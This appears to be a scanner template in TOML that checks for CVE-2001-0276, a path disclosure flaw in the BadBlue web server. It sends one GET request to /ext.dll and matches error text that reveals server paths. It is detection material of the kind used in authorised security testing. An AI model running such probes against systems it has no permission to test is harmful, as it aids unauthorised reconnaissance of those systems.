[info]
author = "ave"
description = "BadBlue ext.dll path disclosure vulnerability verification"
id = "POC-AVE-2001-0114"
name = "CVE-2001-0276 BadBlue ext.dll Path Disclosure PoC"
severity = "medium"
tags = [
    "cve-2001-0276",
    "badblue",
    "path-disclosure",
]
vuln_id = [
    "CVE-2001-0276",
    "AVE-2001-0114",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/ext.dll"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Error: opening",
    ".htx",
]
